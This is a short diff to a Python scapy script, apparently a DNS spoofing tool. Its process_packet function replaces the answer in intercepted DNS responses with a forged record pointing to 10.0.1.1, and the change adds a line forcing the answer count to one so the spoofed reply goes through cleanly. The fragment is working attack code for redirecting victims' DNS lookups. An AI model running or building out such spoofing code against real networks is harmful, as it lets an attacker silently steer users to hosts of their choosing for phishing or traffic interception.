@@ -16,6 +16,8 @@ def process_packet():
             answer = scapy.DNSRR(rrname=qname, rdata="10.0.1.1")
 #.an is answer layer which will be modified by answer above
             scapy_packet[scapy.DNS].an = answer
+#only send one answer
+            scapy_packet[scapy.DNS].ancount = 1
 #.show method shows all layers of packet
         #print(scapy_packet.show())
 #allow packet to its dest 
